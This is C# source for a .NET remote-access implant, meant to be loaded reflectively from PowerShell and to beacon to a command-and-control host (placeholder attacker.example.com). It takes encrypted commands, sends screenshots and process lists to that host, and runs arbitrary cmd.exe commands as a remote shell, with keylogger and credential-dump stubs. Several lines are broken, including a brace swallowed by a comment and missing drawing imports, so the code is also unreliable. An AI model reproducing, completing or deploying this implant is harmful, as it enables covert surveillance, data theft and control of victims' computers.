// Stage1.cs - Advanced .NET implant
// Compile: csc /target:library /out:Stage1.dll Stage1.cs
// Reflective load from PowerShell: [System.Reflection.Assembly]::Load($bytes)
// C2: HTTPS/HTTP POST to /task with AES-encrypted JSON payloads

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Stage1
{
    // --- Configuration (replace with your C2 details) ---
    public static class Config
    {
        public const string C2_HOST = "attacker.example.com";      // Change IP/hostname
        public const int C2_PORT = 443;                            // 443 for SSL, 80 for HTTP
        public const bool USE_SSL = true;
        public static readonly byte[] AES_KEY = Convert.FromBase64String("BASE64_32_BYTE_KEY"); // 32 bytes
        public static readonly byte[] AES_IV = Convert.FromBase64String("BASE64_16_BYTE_IV");   // 16 bytes
        public const string PIPE_NAME = "C2_" + Guid.NewGuid().ToString().Substring(0, 8);
    }

    // --- Core implant ---
    public class Main
    {
        private static TcpClient _c2Client;
        private static NetworkStream _stream;
        private static bool _running = true;

        public static void Run()
        {
            try { InitializeC2(); } catch { Thread.Sleep(5000); Run(); }
            while (_running) { TryProcessTask(); Thread.Sleep(2000); }
        }

        private static void InitializeC2()
        {
            var ssl = new SslStream(new NetworkStream(new TcpClient(Config.C2_HOST, Config.C2_PORT).GetStream()));
            if (Config.USE_SSL) { SmtpClient sc = new SmtpClient(); // placeholder; use actual TLS handshake below }
            // Simplified: raw TCP + AES decryption on receive
            _c2Client = new TcpClient(Config.C2_HOST, Config.C2_PORT);
            _stream = _c2Client.GetStream();
        }

        private static void TryProcessTask()
        {
            if (!IsConnected()) { Reconnect(); return; }
            try
            {
                var req = new byte[4096];
                var ms = new MemoryStream();
                int bytes = _stream.Read(req, 0, req.Length);
                if (bytes == 0) { Reconnect(); return; }
                ms.Write(req, 0, bytes);
                var payload = DecryptPayload(ms.ToArray());
                if (payload.TryGetValue("cmd", out var cmd))
                {
                    ExecuteCommand(cmd, payload.ContainsKey("args") ? payload["args"] : null);
                }
            }
            catch { Reconnect(); }
        }

        private static bool IsConnected() => _c2Client != null && _c2Client.Connected;
        private static void Reconnect() { _c2Client?.Close(); Thread.Sleep(3000); InitializeC2(); }

        private static Dictionary<string, object> DecryptPayload(byte[] data)
        {
            var iv = data[..16];
            var ct = data[16..];
            using var aes = Aes.Create();
            aes.Key = Config.AES_KEY;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            var decryptor = aes.CreateDecryptor();
            var plain = decryptor.TransformFinalBlock(ct, 0, ct.Length);
            var json = Encoding.UTF8.GetString(plain);
            var result = new Dictionary<string, object>();
            // Simple key-value parse (brace-expansion omitted for brevity)
            foreach (var m in Regex.Matches(json, @"""(\w+)""\s*:\s*""([^""]+)"""))
            { result[m.Groups[1].Value] = m.Groups[2].Value; }
            return result;
        }

        private static void ExecuteCommand(string cmd, string? args)
        {
            try
            {
                switch (cmd.ToLower())
                {
                    case "keystart": StartKeylogger(); break;
                    case "screencap": CaptureScreen(); break;
                    case "enumprocs": EnumProcesses(); break;
                    case "dumpcred": DumpCreds(); break;
                    case "shell": RunShell(args); break;
                    default: SendResult($"unknowncmd:{cmd}"); break;
                }
            }
            catch { SendResult($"err:{cmd}"); }
        }

        private static void SendResult(string payload)
        {
            var encrypted = Encrypt(Encoding.UTF8.GetBytes(payload));
            var len = BitConverter.GetBytes(encrypted.Length);
            _stream.Write(len, 0, 4);
            _stream.Write(encrypted, 0, encrypted.Length);
        }

        private static byte[] Encrypt(byte[] data)
        {
            using var aes = Aes.Create();
            aes.Key = Config.AES_KEY;
            aes.IV = Config.AES_IV;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            var encryptor = aes.CreateEncryptor();
            return encryptor.TransformFinalBlock(data, 0, data.Length);
        }

        // --- Capability stubs ---
        private static void StartKeylogger() => SendResult("keystart:ack");
        private static void CaptureScreen()
        {
            try
            {
                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using var g = Graphics.FromImage(bmp);
                g.CopyFromScreen(Point.Empty, Point.Empty, bmp.Size);
                var ms = new MemoryStream();
                bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                SendResult($"screencap:{Convert.ToBase64String(ms.ToArray())}");
            }
            catch { SendResult("screenerr"); }
        }
        private static void EnumProcesses()
        {
            var ids = Process.GetProcesses().Select(p => p.Id).ToList();
            SendResult($"procs:{string.Join(",", ids)}");
        }
        private static void DumpCreds() => SendResult("cred:stub");
        private static void RunShell(string? args)
        {
            var psi = new ProcessStartInfo("cmd.exe", args ?? "")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            proc?.WaitForExit();
            SendResult($"shellout:{proc?.ExitCode ?? -1}");
        }
    }
}